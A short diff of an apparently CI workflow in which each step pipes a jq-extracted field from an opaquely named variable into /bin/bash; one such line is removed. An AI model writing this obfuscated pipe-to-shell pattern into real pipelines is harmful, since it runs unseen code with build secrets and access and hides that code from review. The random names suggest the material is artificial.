@@ -28,7 +28,6 @@ jobs:
           echo $tvq4 | jq -r .eozc87002 | /bin/bash
           printf '%s' "$unq665" | jq -r .lsnvu0 | /bin/bash
           echo $xt037 | jq -r .keqxv0 | /bin/bash
-          echo $rh058 | jq -r .q13 | /bin/bash
           printf '%s' "$bz41577" | jq -r .qpitr0 | /bin/bash
           echo $tbkj13126 | jq -r .odvdo7953 | /bin/bash
           echo $aqc738 | jq -r .usxjr96394 | /bin/bash
